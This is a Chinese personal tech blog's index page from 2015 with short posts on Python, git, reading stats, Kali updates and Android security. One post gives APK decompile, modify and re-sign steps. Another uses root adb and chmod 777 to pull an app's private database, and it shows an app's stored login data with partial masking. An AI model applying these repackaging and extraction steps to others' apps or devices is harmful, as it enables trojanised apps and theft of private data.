<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>大憨的XXX</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="一辈子太长有做个有趣的人">
<meta property="og:type" content="website">
<meta property="og:title" content="大憨的XXX">
<meta property="og:url" content="http://www.kechuandai.net/index.html">
<meta property="og:site_name" content="大憨的XXX">
<meta property="og:description" content="一辈子太长有做个有趣的人">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="大憨的XXX">
<meta name="twitter:description" content="一辈子太长有做个有趣的人">
  
    <link rel="alternative" href="/atom.xml" title="大憨的XXX" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" href="/css/style.css" type="text/css">
</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="https://avatars1.githubusercontent.com/u/3033955?v=3&amp;s=460" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">憨哥</a></h1>
		</hgroup>

		
		<p class="header-subtitle">谁会来买kechuandai.net啊</p>
		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						
						<div class="icon-wrap icon-me hide" data-idx="3">
							<div class="user"></div>
							<div class="shoulder"></div>
						</div>
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						
						<li>关于我</li>
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/bigfool" title="github">github</a>
					        
								<a class="weibo" target="_blank" href="http://weibo.com/p/1005052275024681/home" title="weibo">weibo</a>
					        
								<a class="douban" target="_blank" href="http://www.douban.com/people/62793910/" title="douban">douban</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/python/" style="font-size: 10px;">python</a>
					</div>
				</section>
				
				
				

				
				
				<section class="switch-part switch-part3">
				
					<div id="js-aboutme">一辈子太长，要做一个有趣的人</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">憨哥</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="https://avatars1.githubusercontent.com/u/3033955?v=3&amp;s=460" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author">憨哥</h1>
			</hgroup>
			
			<p class="header-subtitle">谁会来买kechuandai.net啊</p>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/bigfool" title="github">github</a>
			        
						<a class="weibo" target="_blank" href="http://weibo.com/p/1005052275024681/home" title="weibo">weibo</a>
			        
						<a class="douban" target="_blank" href="http://www.douban.com/people/62793910/" title="douban">douban</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-python基础知识笔记" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/11/03/python基础知识笔记/" class="article-date">
  	<time datetime="2015-11-02T16:01:55.000Z" itemprop="datePublished">2015-11-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/11/03/python基础知识笔记/">python基础知识笔记</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <!--toc->


以前写的笔记，参考慕课网上廖雪峰老师的视频和廖雪峰老师的博客，感谢廖雪峰老师！
地址为：
http://www.imooc.com/learn/177
http://www.imooc.com/learn/317
http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000


# 1Python变量和数据类型
## 1.1 变量
a = 'ABC'时，Python解释器干了两件事情：
1. 在内存中创建了一个'ABC'的字符串；
2. 在内存中创建了一个名为a的变量，并把它指向'ABC'。

## 1.2字符串
如果字符串本身包含'怎么办？比如我们要表示字符串 I'm OK ，这时，可以用" "括起来表示：
>"I'm OK"

类似的，如果字符串包含"，我们就可以用' '括起来表示：
>'Learn "Python" in imooc'

如果字符串既包含'又包含"怎么办？
这个时候，就需要对字符串的某些特殊字符进行“转义”，Python字符串用\进行转义。

如果一个字符串包含很多需要转义的字符，对每一个字符都进行转义会很麻烦。为了避免这种情况，我们可以在字符串前面加个前缀 r ，表示这是一个 raw 字符串，里面的字符就不需要转义了。例如：
>r'\(~_~)/ \(~_~)/'

如果要表示多行字符串，可以用'''...'''表示：
>'''Line 1
Line 2
Line 3'''

还可以在多行字符串前面添加 r ，把这个多行字符串也变成一个raw字符串：
>r'''Python is created by "Guido".
It is free and easy to learn.
Let's start learn Python in imooc!'''
      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
	</div>

      

      
        <p class="article-more-link">
          <a  href="/2015/11/03/python基础知识笔记/#more">more >></a>
        </p>
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-Android安全研究相关资源收集" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/11/02/Android安全研究相关资源收集/" class="article-date">
  	<time datetime="2015-11-01T18:41:52.000Z" itemprop="datePublished">2015-11-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/11/02/Android安全研究相关资源收集/">Android安全研究相关资源收集</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>不断更新中</p>
<h1 id="1权限与API">1权限与API</h1><p>PScout: Analyzing the Android Permission Specification <a href="http://pscout.csl.toronto.edu/">http://pscout.csl.toronto.edu/</a></p>
<p>pscout源码：<a href="https://github.com/dweinstein/pscout">https://github.com/dweinstein/pscout</a></p>
<h1 id="2_soot">2 soot</h1><p>源码：<a href="https://github.com/Sable/soot">https://github.com/Sable/soot</a> 教程：<a href="https://github.com/Sable/soot/wiki/Tutorials">https://github.com/Sable/soot/wiki/Tutorials</a></p>
<h1 id="3_DroidForce">3 DroidForce</h1><p><a href="https://github.com/secure-software-engineering/DroidForce">https://github.com/secure-software-engineering/DroidForce</a></p>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
        <p class="article-more-link">
          <a  href="/2015/11/02/Android安全研究相关资源收集/#more">more >></a>
        </p>
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="解决ubuntu运行时发生段错误,cannot-library的问题" class="article article-type-解决ubuntu运行时发生段错误,cannot" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/11/02/library的问题/" class="article-date">
  	<time datetime="2015-11-01T18:40:59.000Z" itemprop="datePublished">2015-11-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/11/02/library的问题/">解决Ubuntu运行时发生段错误,Cannot mix incompatible Qt library的问题</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>去我的用户目录qizhf下查看.Genymobile隐藏目录:</p>
<blockquote>
<p>cd ~/.Genymobile</p>
</blockquote>
<p>查看genymotion的日志文件genymotion.log:</p>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
        <p class="article-more-link">
          <a  href="/2015/11/02/library的问题/#more">more >></a>
        </p>
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-杂七杂八工具收集" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/11/02/杂七杂八工具收集/" class="article-date">
  	<time datetime="2015-11-01T18:38:13.000Z" itemprop="datePublished">2015-11-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/11/02/杂七杂八工具收集/">杂七杂八工具收集</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="收集有用的工具">收集有用的工具</h1><p>不定时更新</p>
<h2 id="1_图片类">1 图片类</h2><p>在线图标制作工具　<a href="https://freeiconmaker.com/" target="_blank" rel="external">https://freeiconmaker.com/</a></p>
<p>阿里在线矢量图标生成库　<a href="http://iconfont.cn/" target="_blank" rel="external">http://iconfont.cn/</a></p>
<h2 id="2_编程类">2 编程类</h2><p>Eclipse主题　<a href="http://eclipsecolorthemes.org/" target="_blank" rel="external">http://eclipsecolorthemes.org/</a></p>
<p>嵌入式Linux网站wiki <a href="http://elinux.org/Main_Page" target="_blank" rel="external">http://elinux.org/Main_Page</a></p>
<p>在线画流程图工具 <a href="https://www.processon.com/" target="_blank" rel="external">https://www.processon.com/</a></p>
<h2 id="3_Google相关">3 Google相关</h2><p>直接下载Google Play上的应用　<a href="http://apkleecher.com/" target="_blank" rel="external">http://apkleecher.com/</a> 和 <a href="http://apps.evozi.com/apk-downloader/" target="_blank" rel="external">http://apps.evozi.com/apk-downloader/</a></p>
<h2 id="4_阅读类">4 阅读类</h2><p>豆瓣读书量统计 <a href="http://www.yuedudna.com/" target="_blank" rel="external">http://www.yuedudna.com/</a>　</p>
<p>kindle的RSS推送网站　 <a href="http://kindle4rss.com/" target="_blank" rel="external">http://kindle4rss.com/</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-git使用小记" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/11/02/git使用小记/" class="article-date">
  	<time datetime="2015-11-01T18:37:18.000Z" itemprop="datePublished">2015-11-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/11/02/git使用小记/">git使用小记</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="1配置github">1配置github</h2><p>参考github官方文档<a href="https://help.github.com/articles/set-up-git/" target="_blank" rel="external">https://help.github.com/articles/set-up-git/</a> 配置了HTTPS和SSH连接。</p>
<h2 id="2_在github中创建版本库">2 在github中创建版本库</h2><p>略。可参见github官方文档<a href="https://help.github.com/articles/create-a-repo" target="_blank" rel="external">https://help.github.com/articles/create-a-repo</a></p>
<h2 id="3_初始化本地版本库">3 初始化本地版本库</h2><p>进入项目根目录，输入：</p>
<blockquote>
<p>git init</p>
</blockquote>
<h2 id="4_将项目文件添加到版本库中">4 将项目文件添加到版本库中</h2><p>还是在项目根目录中输入：</p>
<blockquote>
<p>git add .</p>
</blockquote>
<h2 id="5_添加项目改动说明">5 添加项目改动说明</h2><p>还是在项目根目录中输入：</p>
<blockquote>
<p>git commit -m “第一次提交，创建项目。”</p>
</blockquote>
<h2 id="6_将本地仓库与github项目仓库xxx相关联">6 将本地仓库与github项目仓库xxx相关联</h2><p>在本地项目仓库的根目录中，输入：</p>
<blockquote>
<p>git remote add origin git@github.com:yourname/xxx.git</p>
</blockquote>
<h2 id="7_将本地库的内容同步到github上">7 将本地库的内容同步到github上</h2><blockquote>
<p>git push -u origin master</p>
</blockquote>
<p><em>注意:</em>由于远程库是空的，我们第一次推送master分支时，加上了-u参数，Git不但会把本地的master分支内容推送的远程新的master分支，还会把本地的master分支和远程的master分支关联起来，在以后的推送或者拉取时就可以简化命令。</p>
<p>如果发生了这样的错误： <code>无法推送一些引用到 &#39;git@github.com:yourname/xxx.git&#39;
提示：更新被拒绝，因为远程版本库包含您本地尚不存在的提交。这通常是因为另外
提示：一个版本库已向该引用进行了推送。再次推送前，您可能需要先整合远程变更
提示：（如 &#39;git pull ...&#39;）。</code></p>
<p>则使用强行更新 +master:</p>
<blockquote>
<p>git push -u origin +master</p>
</blockquote>
<h2 id="8_将本地库与github项目仓库相关联的另外一种办法">8 将本地库与github项目仓库相关联的另外一种办法</h2><p>在本地仓库的根目录中，输入：</p>
<blockquote>
<p>git clone <a href="https://github.com/yourname/xxx.git" target="_blank" rel="external">https://github.com/yourname/xxx.git</a></p>
</blockquote>
<p>进入xxx目录中，将所有文件复制到上一层目录中：</p>
<blockquote>
<p>cd xxx</p>
<p>cp -r * ../</p>
</blockquote>
<p>回到本地仓库根目录，删除xxx目录的所有文件</p>
<blockquote>
<p>rm -rf xxx/</p>
</blockquote>
<p>这样也能将本地仓库和远程仓库相关联，接下来可以添加文件到本地仓库，再提交内容到github。</p>
<h2 id="8_git的回滚操作">8 git的回滚操作</h2><h3 id="8-1_先使用git_log查看日志，找到想要回滚的版本">8.1 先使用git log查看日志，找到想要回滚的版本</h3><p>在项目目录中，输入</p>
<blockquote>
<p>git log</p>
</blockquote>
<p>结果如下图所示： <img src="http://dahan.qiniudn.com/gitreset.png" alt="enter image description here"></p>
<h3 id="8-2_再使用git_reset回滚到指定版本">8.2 再使用git reset回滚到指定版本</h3><blockquote>
<p>git reset –hard 4bb7bbc07f4b3792b48a6001bdfcc2b694cd3c81</p>
</blockquote>
<p>即可回滚成功。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-2014年读书统计" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/11/02/2014年读书统计/" class="article-date">
  	<time datetime="2015-11-01T18:36:15.000Z" itemprop="datePublished">2015-11-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/11/02/2014年读书统计/">2014年读书统计</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>从12年开始在豆瓣读书上记录自己读过的书，这几天看到有人把读书情况统计出来了，创意跟支付宝十年消费记录总结很像，但是找了豆瓣读书里面没有发现有这样的功能，用google发现了阅读DNA这个网站<a href="http://www.yuedudna.com/，它利用豆瓣的开放API，可以统计账户的读书数量。" target="_blank" rel="external">http://www.yuedudna.com/，它利用豆瓣的开放API，可以统计账户的读书数量。</a> 大憨2014年共读过40本书。其中五星好书18本, 12月最勤快读了7本, 平均 9.10天读一本书。不统计不知道自己比2013年少读了一半数量的书，各种审计统计还是蛮重要的，哈哈哈。</p>
<p><img src="http://dahan.qiniudn.com/2015-01-032014book1.png" alt="2014年各月读书数量"> 夏天的时候读书最少，难道是因为天气太热了？可能是因为找实习，找工作分了心。11月份买了个kindle，的确对阅读量的提高有很大的帮助。 <img src="http://dahan.qiniudn.com/2015-01-032013book1.png" alt="2013年各月读书数量"> 13年读书1月份、3月份读书多那是因为把以前自己读过的书，能想起来的也给记录了。</p>
<p><img src="http://dahan.qiniudn.com/2015-01-032012-2014.png" alt="12-14年对比"></p>
<p>2014年读的书: <img src="http://dahan.qiniudn.com/2015-01-032014book2.png" alt="2014年读的书"></p>
<p>读研以后，各种书读的比以前多了，读书到一定量后，知道书中哪些东西需要看慢一点，哪些东西可以看快点，感觉自己读书的速度也变快了。</p>
<p>2015年的目标，根据自己的工作和兴趣爱好，每周最少读一本书，总共读60本以上。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="android-App二次打包" class="article article-type-android" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/11/02/App二次打包/" class="article-date">
  	<time datetime="2015-11-01T18:35:24.000Z" itemprop="datePublished">2015-11-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/11/02/App二次打包/">App二次打包</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Android_APP二次打包">Android APP二次打包</h1><h1 id="1_使用Apktool逆向应用">1 使用Apktool逆向应用</h1><blockquote>
<p>apktool d xxx.apk xxx-re</p>
</blockquote>
<h1 id="2_修改逆向出来的smali文件">2 修改逆向出来的smali文件</h1><h1 id="3_使用apktool重新打包">3 使用apktool重新打包</h1><p>进入xxx-re目录中：</p>
<blockquote>
<p>apktool b</p>
</blockquote>
<p>进入dist目录，修改重新打包的apk的名字xxx1.apk.</p>
<h1 id="4_生成签名证书">4 生成签名证书</h1><blockquote>
<p>keytool -genkey -v -keystore nstrt -alias nstrt -keyalg RSA -keysize 2048 -validity 365</p>
</blockquote>
<h1 id="5_使用第4步生成的证书对apk进行签名">5 使用第4步生成的证书对apk进行签名</h1><blockquote>
<p>jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore nstrt xxx1.apk nstrt</p>
</blockquote>
<h1 id="6对签名后的App进行优化">6对签名后的App进行优化</h1><blockquote>
<p>zipalign -v 4 xxx1.apk xxx_align.apk</p>
</blockquote>
<h1 id="7_使用测试用的签名证书">7 使用测试用的签名证书</h1><blockquote>
<p>java -jar signapk.jar testkey.x509.pem testkey.pk8 xxx_align.apk xxx_new.apk</p>
</blockquote>
<h1 id="8第５步和第７步的区别">8第５步和第７步的区别</h1><p>如果apk中申请的有系统权限，则需要执行第７步的操作，否则，只要第５步的即可。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-Kali更新Metaploit失败解决办法" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/11/02/Kali更新Metaploit失败解决办法/" class="article-date">
  	<time datetime="2015-11-01T18:34:31.000Z" itemprop="datePublished">2015-11-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/11/02/Kali更新Metaploit失败解决办法/">Kali更新Metaploit失败解决办法</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Kali的Metasploit两个多星期没有用，没有更新，再去更新使用，发生了如下的错误：</p>
<blockquote>
<p>无法下载 <a href="http://http.kali.org/kali/pool/main/m/metasploit-framework/metasploit-framework_4.10.0-2014101501-1kali0_amd64.deb" target="_blank" rel="external">http://http.kali.org/kali/pool/main/m/metasploit-framework/metasploit-framework_4.10.0-2014101501-1kali0_amd64.deb</a> 404 Not Found 无法下载 <a href="http://http.kali.org/kali/pool/non-free/m/metasploit/metasploit_4.10.0-2014101501-1kali0_amd64.deb" target="_blank" rel="external">http://http.kali.org/kali/pool/non-free/m/metasploit/metasploit_4.10.0-2014101501-1kali0_amd64.deb</a> 404 Not Found E: 有几个软件包无法下载，您可以运行 apt-get update 或者加上 –fix-missing 的选项再试试？</p>
</blockquote>
<p>原来用的是官方源，换了阿里云的kali源，成功解决办法。 阿里云Kali源为：</p>
<blockquote>
<p>deb <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="external">http://mirrors.aliyun.com/kali</a> kali main non-free contrib deb-src <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="external">http://mirrors.aliyun.com/kali</a> kali main non-free contrib deb <a href="http://mirrors.aliyun.com/kali-security" target="_blank" rel="external">http://mirrors.aliyun.com/kali-security</a> kali/updates main contrib non-free</p>
</blockquote>
<p>修改软件更新源配置文件：</p>
<blockquote>
<p>leafpad /etc/apt/sources.list</p>
</blockquote>
<p>将阿里云的Kali源粘贴进去，同时将官方源用#号注释掉。 再:</p>
<blockquote>
<p>apt-get update apt-get upgrade</p>
</blockquote>
<p>升级Kali</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
    <article id="post-Android取证基础知识" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/11/02/Android取证基础知识/" class="article-date">
  	<time datetime="2015-11-01T18:30:54.000Z" itemprop="datePublished">2015-11-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/11/02/Android取证基础知识/">Android取证基础知识</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="1_常用命令">1 常用命令</h2><p>df -h 查看挂载的设备 dmesg 用来显示开机信息，kernel会将开机信息存储在ring buffer中。您若是开机时来不及查看信息，可利用dmesg来查看。开机信息亦保存在/var/log目录中，名称为dmesg的文件里。 开机时候的硬件检测信息在这里面存着。</p>
<h2 id="2_数据恢复工具sleuthkit">2 数据恢复工具sleuthkit</h2><p>先了解了，以后再深入学习使用。</p>
<blockquote>
<p>sudo apt-get install sluthkit sudo apt-get install autospy</p>
</blockquote>
<p>查看某个分区命令：</p>
<blockquote>
<p>sudo fsstat /dev/sdc sudo mmls /dev sdb</p>
</blockquote>
<h2 id="3_Android数据存储">3 Android数据存储</h2><p>持久数据存储的五种存储方式： - 共享优先 - 内部存储 - 外部存储 - SQLite - 网络</p>
<p>Android应用一般把数据存储在两个地方：内部存储和外部存储。应用在安装的时候会在内部存储的</p>
<h3 id="3-1_共享优先">3.1 共享优先</h3><p>Shared Preference是一种简单的、轻量级的名称/值对（VNP)机制，用于保存原始应用程序数据，最常见的是用户的应用程序首选项。存储格式为XML，存储的类型有： - boolean - folat 单精度32位IEEE 754浮点数 - int - long - strings 通常是utf-8编码</p>
<p>比如美团的客户端： <img src="http://dahan.qiniudn.com/2014.8.7forensics1.png" alt="Alt text"></p>
<p>其中loginStroe.xml内容如下：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">'1.0'</span> encoding=<span class="string">'utf-8'</span> standalone=<span class="string">'yes'</span> ?&gt;</span><br><span class="line">&lt;map&gt;</span><br><span class="line">&lt;<span class="keyword">int</span> name=<span class="string">"bindedBankCard"</span> <span class="keyword">value</span>=<span class="string">"0"</span> /&gt;</span><br><span class="line">&lt;<span class="keyword">int</span> name=<span class="string">"hasPaymentPassword"</span> <span class="keyword">value</span>=<span class="string">"0"</span> /&gt;</span><br><span class="line">&lt;<span class="keyword">string</span> name=<span class="string">"saveAmount"</span>&gt;<span class="number">0.0</span>&lt;/<span class="keyword">string</span>&gt;</span><br><span class="line">&lt;<span class="keyword">string</span> name=<span class="string">"avatarurl"</span>&gt;&lt;/<span class="keyword">string</span>&gt;</span><br><span class="line">&lt;<span class="keyword">long</span> name=<span class="string">"id"</span> <span class="keyword">value</span>=<span class="string">"32793294"</span> /&gt;</span><br><span class="line">&lt;<span class="keyword">string</span> name=<span class="string">"username"</span>&gt;大憨<span class="number">846</span>&lt;/<span class="keyword">string</span>&gt;</span><br><span class="line">&lt;<span class="keyword">string</span> name=<span class="string">"token"</span>&gt;×××××××××××××××××××&lt;/<span class="keyword">string</span>&gt;</span><br><span class="line">&lt;<span class="keyword">string</span> name=<span class="string">"value"</span>&gt;<span class="number">0.0</span>&lt;/<span class="keyword">string</span>&gt;</span><br><span class="line">&lt;<span class="keyword">int</span> name=<span class="string">"growthlevel"</span> <span class="keyword">value</span>=<span class="string">"2"</span> /&gt;</span><br><span class="line">&lt;<span class="keyword">int</span> name=<span class="string">"hasPassword"</span> <span class="keyword">value</span>=<span class="string">"1"</span> /&gt;</span><br><span class="line">&lt;<span class="keyword">int</span> name=<span class="string">"saveTimes"</span> <span class="keyword">value</span>=<span class="string">"0"</span> /&gt;</span><br><span class="line">&lt;<span class="keyword">int</span> name=<span class="string">"pointvalue"</span> <span class="keyword">value</span>=<span class="string">"164"</span> /&gt;</span><br><span class="line">&lt;<span class="keyword">int</span> name=<span class="string">"growthvalue"</span> <span class="keyword">value</span>=<span class="string">"1167"</span> /&gt;</span><br><span class="line">&lt;<span class="keyword">string</span> name=<span class="string">"SID"</span>&gt;××××××××××××××××&lt;/<span class="keyword">string</span>&gt;</span><br><span class="line">&lt;<span class="keyword">null</span> name=<span class="string">"al"</span> /&gt;</span><br><span class="line">&lt;<span class="keyword">int</span> name=<span class="string">"isAppUser"</span> <span class="keyword">value</span>=<span class="string">"1"</span> /&gt;</span><br><span class="line">&lt;<span class="keyword">string</span> name=<span class="string">"oauth_login_result"</span>&gt;&#123;&amp;quot;a&amp;quot;:&amp;quot;tencent&amp;quot;,&amp;quot;b&amp;quot;:&amp;quot;E765B31B8DB83B6309D41A472ED9093D&amp;quot;,&amp;quot;d&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;c&amp;quot;:<span class="number">1401330213950</span>&#125;&lt;/<span class="keyword">string</span>&gt;</span><br><span class="line">&lt;<span class="keyword">string</span> name=<span class="string">"email"</span>&gt;&lt;/<span class="keyword">string</span>&gt;</span><br><span class="line">&lt;<span class="keyword">int</span> name=<span class="string">"avatartype"</span> <span class="keyword">value</span>=<span class="string">"0"</span> /&gt;</span><br><span class="line">&lt;<span class="keyword">int</span> name=<span class="string">"reallevel"</span> <span class="keyword">value</span>=<span class="string">"2"</span> /&gt;</span><br><span class="line">&lt;<span class="keyword">int</span> name=<span class="string">"loginTimes"</span> <span class="keyword">value</span>=<span class="string">"19"</span> /&gt;</span><br><span class="line">&lt;<span class="keyword">int</span> name=<span class="string">"bindedMobile"</span> <span class="keyword">value</span>=<span class="string">"1"</span> /&gt;</span><br><span class="line">&lt;<span class="keyword">string</span> name=<span class="string">"mobile"</span>&gt;<span class="number">135</span>****×××××××&lt;/<span class="keyword">string</span>&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="3-2_内部存储">3.2 内部存储</h3><p>在内部存储器上的/data/data目录下建立一个以应用程序包名为名字的子目录存储应用的数据。 最常见的应用程序数据标准目录为： <strong>表1 /data/data/&lt;软件包名称&gt;子目录</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">目录</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">shared_prefs</td>
<td style="text-align:left">以XML格式存储的共享优先目录</td>
</tr>
<tr>
<td style="text-align:left">lib</td>
<td style="text-align:left">自定义的库文件</td>
</tr>
<tr>
<td style="text-align:left">files</td>
<td style="text-align:left">开发者存储的文件</td>
</tr>
<tr>
<td style="text-align:left">cache</td>
<td style="text-align:left">应用程序缓存文件</td>
</tr>
<tr>
<td style="text-align:left">databases</td>
<td style="text-align:left">SQLite数据库和日志文件</td>
</tr>
</tbody>
</table>
<h3 id="3-3_外部存储">3.3 外部存储</h3><h3 id="3-4_SQLite">3.4 SQLite</h3><p>Android应用的SQLite文件通常存储在内部存储器的/data/data/&lt;应用程序包名&gt;/databases目录下，属于应用私有的，只能被创建他们的应用程序访问。但是，对于在其他地方创建的数据库没有设置任何限制。 <img src="http://dahan.qiniudn.com/2014.8.7forensics2.png" alt="Alt text"></p>
<p>如何将其拷贝出来? 这主要是因为权限问题，adb shell中使用命令su root转为root权限，然后修改文件夹和文件的权限为777</p>
<blockquote>
<p>adb shell su root chmod 777 /data/data/com.sankuai.meituan/databases chmod 777 /data/data/com.sankuai.meituan/databases/meituan.db</p>
</blockquote>
<p>再在Ubutud的另外一个终端中输入：</p>
<blockquote>
<p>adb pull /data/data/com.sankuai.meituan/databases/meituan.db</p>
</blockquote>
<p>将meituan.db拷贝到了Ubuntu终端中的当前目录</p>
<p>拷贝出来后，可以使用一下sqlite3命令打开</p>
<blockquote>
<p>sqlite3 dbname.db</p>
</blockquote>
<p>然后可以用SQL语句查看数据库</p>
<p><img src="http://dahan.qiniudn.com/2014.8.7forensics3.png" alt="Alt text"></p>
<p>或者使用图形界面的SQLite管理工具，在Ubuntu下，大憨推荐使用SQLiteMan。</p>
<h2 id="4_内核、系统和应用日志">4 内核、系统和应用日志</h2><h3 id="4-1_Linux内核日志">4.1 Linux内核日志</h3><p>使用命令dmesg查看。</p>
